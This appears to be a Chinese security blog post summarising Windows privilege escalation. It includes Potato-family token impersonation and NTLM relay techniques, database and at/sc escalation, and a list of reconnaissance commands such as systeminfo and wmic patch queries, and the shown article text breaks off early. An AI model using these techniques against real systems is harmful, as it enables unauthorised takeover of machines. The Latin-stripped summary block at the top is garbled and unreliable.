上模拟当用户具有特权则可以调用以某个的权限启动新进程当用户具有特权则可以调用以权限启动新进程为什么会有一系列函数微软本意是让高权限服务端可以模拟低权限客户端来执行操作以提高安全性但被攻击者反向使用了以下案例的具体实践过程参考如下文章提权合集家族提权分析也可以说是最初始的年月发表了一篇文章发布了一种基于反射的权限提升攻击方式命名为可以从主机的最低用户权限提升至系统最高的权限利用著名的攻击和欺骗攻击获取系统的最高权限可以从主机的最低用户权限提升至系统最高的权限影响范围和如果要更深入地了解这种技术建议研究人员发布视频协议是系统中广泛被使用的广播服务即命名查询服务该服务使用协议实现可以通过发送局域网内广播来实现本地名称解析类似于协议中的它负责查找目标机器相应的地址并赋予一个名称微软服务就是采用协议欺骗系统进行一个名字查询的逻辑如下首先查询本地的文件查询本地再向服务器请求查询的逻辑是向本地所有主机广播一条消息谁是如果谁响应了该广播消息谁就是在内网渗透测试时攻击者往往会监听广播消息并且会应答自己是这就是欺骗欺骗是层的欺骗方式包有个字节的字段必须进行请求响应的匹配因为是提权漏洞所以攻击之前没有权限可以监听流量可以通过之间进行泛洪猜测如果网络中有记录此时就不会用到协议可以通过端口耗尽的攻击技术让所有查询失败从而必须使用协议代理系统里浏览器会自动检测代理配置信息方式是访问是不一定存在于网络中因为主机名也不一定存在于服务器中除非网络想通过配置脚本自动配置网络中的代理信息这种情况很方便因此在查询都不能获取的情况下系统必然使用进行名字查询此时可以通过欺骗告知自己就是可以构造服务器响应查询借用网上的图认证对于中间人攻击的防御能力不强此前针对的重放攻击聚焦于协议反射攻击访问者的主机获取远程执行权限微软通过补丁封堵了协议的重放反射攻击但是这种跨协议的攻击仍然有效攻击流程攻击就是结合了这几点实现权限提升欺骗构造本地响应等待高权限进程的访问即激活更新服务低权限可激活下述流程也同上面一致本地冒充名称解析强制系统下载恶意配置伪造代理服务器部署配置强制系统进行认证中继将令牌中继到服务以创建提升的进程此技术不适用于和的版本原理这两种不同于初始的它是通过来使服务向攻击者监听的端口发起连接并进行认证和几乎是同样的原理后者在前者的基础上完善需要理解的几个知识使用时如果以服务的方式远程连接那么权限为例如服务使用可以通过连接到本机的一个端口发起认证该认证可以被重放用户默认具有和权限开启权限后能够在调用时传入新的创建新的进程开启权限后能够在调用时传入新的创建新的进程攻击流程加载发出请求权限为在指定和端口的位置尝试加载一个对象使用的对象为为可供选择的对象不唯一提供了多个详细列表可参考如下地址回应步骤的请求发起认证正常情况下由于权限不足当前权限不是无法认证成功针对本地端口同样发起认证权限为当前用户由于权限为当前用户所以认证能够成功完成注意使用的端口支持指定任意本地端口但是一般默认为端口很少被修改分别拦截两个认证的数据包替换数据通过重放使得步骤权限为的认证通过获得权限的重放时需要注意认证的不同需要修正利用权限的创建新进程如果开启权限调用传入权限的创建的进程为权限或者如果开启权限调用传入权限的创建的进程为权限原理通过的一个来模拟高权限客户端的还有类似的函数调用该函数后会更改当前线程的安全上下文它利用了打印机组件路径检查的使权限服务能连接到攻击者创建的服务有一个公开的服务里面有以下函数参数需要传递路径传递时服务器会访问但这个管道已经被系统注册了如果我们传递则因为路径检查而报错但当传递时校验路径时会认为是主机名随后在连接时会对参数做标准化将转化为于是就会连接攻击者就可以注册这个从而窃取的这个启动新进程是使用而不是原理这个也是利用了命名管道微软修补后高版本解析器不允许中的字段指定端口号为了绕过这个限制并能做本地令牌协商作者在一台远程主机上的端口做流量转发将其转回受害者本机端口并写了一个恶意解析器我们无法在最新的版本中为解析器地址指定自定义端口如果我们将解析请求重定向到我们控制下的端口上的远程服务器并将请求转发到我们的本地服务器我们将仅获得一个匿名登录如果我们将解析请求解析到一个假的服务器我们将在接口查询期间获得一个标识令牌攻击流程通过指定远程攻击者指示服务器执行远程查询在远程上设置一个侦听器用于将解析请求重定向到一个假的服务器伪造的服务器实现了服务器过程该过程将指向受控命名管道服务器将连接到服务器以执行接口调用通过连接到命名管道将执行身份验证回调我们可以通过调用模拟调用者然后令牌窃取者获取服务的打开进程列出所有句柄并为每个句柄尝试复制它并获取句柄类型如果句柄类型为且令牌所有者为则尝试使用或模拟并启动进程的集合版也就是的集合版相关文章这个漏洞绕过了之后用户不能回本机的限制利用工具原理主机向主机访问进行认证的时候将设置为然后在拿到主机发送之后在里面缓存然后主机在拿到主机的之后会去里面有没有缓存如果存在缓存那么认证失败这种情况底下如果主机和主机是不同的主机的话那里面就不会缓存如果是同一台主机的话那里面肯定有缓存这个时候就会认证失败然而这个缓存是有时效性的这个时间是秒也就是说秒后缓存就会被清空这个时候即使主机和主机是同一台主机那么由于缓存已经被清除那么去里面肯定找不到缓存具体过程可参考内网渗透反射分析及土豆家族数据库提权鉴于这个设计的内容挺多的详情就看本笔记的提权学习二下面做个简单介绍在上经常会装这两个数据库数据库提权数据库提权所以直接针对这两个数据库进行提权提权在利用提权之前首先要回顾一下的常用命令查路径查用户注册函数查版本导出写文件开外连读文件移动文件查找密码利用提权的三种方式均需要获取数据库最高权限的帐号密码所以我们先讨论下如何获取的密码翻配置文件关键字等下载数据文件并破解密文密码密文存放在数据库存储目录中低权限下可以用以下命令读取或者直接使用暗月的低权限读取密码工具然后使用解密即可剩下的看提权学习二提权见提权学习二其他类型提权命令提权在这三类系统中我们可以轻松将组下的用户权限提升到是一个发布定时任务计划的命令行工具语法比较简单通过命令发布的定时任务计划默认以权限运行定时任务计划可以是批处理可以是一个二进制文件本地提权语法时间命令例子该命令会发布一个定时任务计划在每日的启动我们可以通过开启界面交互模式在得到一个的之后使用命令调用任务管理器此时的任务管理器是权限然后掉进程再使用任务管理器新建进程将会得到一个的桌面环境配合提权下生成木马文件命令执行运行程序上线后即为命令提权适用范围关于命令是用于与服务控制管理器和服务进行通信的命令行程序提供的功能类似于控制面板中管理工具项中的服务这个命令的意思是创建一个名叫的新的交互式的服务然后执行以下命令就得到了一个权限的环境常用工具权限提升枚举脚本此脚本旨在识别通常由配置问题或不良做法引起的本地权限提升漏洞它还可以为某些漏洞利用和漏洞利用后任务收集有用的信息是一个简单的信标目标文件可检测操作系统上因配置错误而导致的权限提升漏洞通过滥用内置的后门来破坏用户帐户控制是一个利用泄露的工具它可以从系统中的所有进程中找到泄漏的并使用它们如果你是低权限的服务用户甚至可以用它升级到权限并且无需目标用户的密码就可以切换到目标用户的桌面进行更多操作这个与上面提权的工具不一样另一个从服务帐户到系统的本地权限提升某些服务对象和滥用只是另一个土豆就像其他土豆一样使用服务进行权限升级对于未测试未测试使用新的马铃薯技术的另一个本地权限升级攻击是一种针对本地身份验证的反射攻击此攻击允许任意文件读写和特权提升参考文章常见提权总结关于提权小结提权总结家族本地提权细节提权合集家族提权分析史上最全提权手法总结这都不看系统提权方式汇总提权总结超详细',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-12 16:05:10',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Windows%E6%8F%90%E6%9D%83/" itemprop="url">Windows提权</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Windows%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Windows提权</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Windows提权总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-12T08:05:10.720Z" title="更新于 2024-08-12 16:05:10">2024-08-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">16.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>55分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Windows提权总结"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/05/windows-ti-quan-zong-jie/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/08/05/windows-ti-quan-zong-jie/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/"><header><a class="post-meta-categories" href="/categories/Windows%E6%8F%90%E6%9D%83/" itemprop="url">Windows提权</a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url">Windows提权</a><h1 id="CrawlerTitle" itemprop="name headline">Windows提权总结</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time><time itemprop="dateCreated datePublished" datetime="2024-08-12T08:05:10.720Z" title="更新于 2024-08-12 16:05:10">2024-08-12</time></header><h1 id="0x01-简介">0x01 简介</h1>
<p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p>
<p>Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等</p>
<blockquote>
<p>提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权</p>
<p>比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢?</p>
<p>是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&gt;dll劫持–&gt;不安全的服务–&gt;手工提权这么一个流程</p>
</blockquote>
<h2 id="windows-权限划分">Windows 权限划分</h2>
<ul>
<li>User：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料</li>
<li>Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等</li>
<li>System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作</li>
<li>TrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件</li>
</ul>
<h1 id="0x02-提权信息搜集">0x02 提权信息搜集</h1>
<p>对于系统的基本信息一般包括：主机名、所属域、环境变量等，涉及的命令如下：</p>
<h2 id="基本信息">基本信息</h2>
<p>常见使用命令：</p>
<pre><code class="hljs scss"># 查询系统信息
systeminfo 
# 如果要查看特定的信息，可以使用
systeminfo | findstr /<span class="hljs-selector-tag">B</span> /C:<span class="hljs-string">"OS名称"</span> /C:<span class="hljs-string">"OS版本"</span>
# 主机名
Hostname
# 环境变量
Set
# 查看用户信息
Net user
# 查看服务 pid 号
tasklist /svc|find <span class="hljs-string">"TermService"</span>
netstat -ano|find <span class="hljs-string">"3389"</span>
# 查看系统名
wmic os get caption
# 查看补丁信息
wmic qfe get Description,HotFixID,InstalledOn
# 如果要定位到特定的补丁可以使用如下命令
wmic qfe get Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">"KB4346084"</span> /C:<span class="hljs-string">"KB4509094"</span>

wmic service list brief #查询本机服务 

wmic process list brief #查询本机进程

# 查看当前安装程序
wmic product get name,version

quser 或者 query user #获取在线⽤⼾（某些版本命令不存在）

dir c:\programdata\ #分析安装杀软

REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber #获取远程端⼝

netsh firewall show config #查看防火墙配置</code></pre>
<p>获取主机名：</p>
<blockquote>
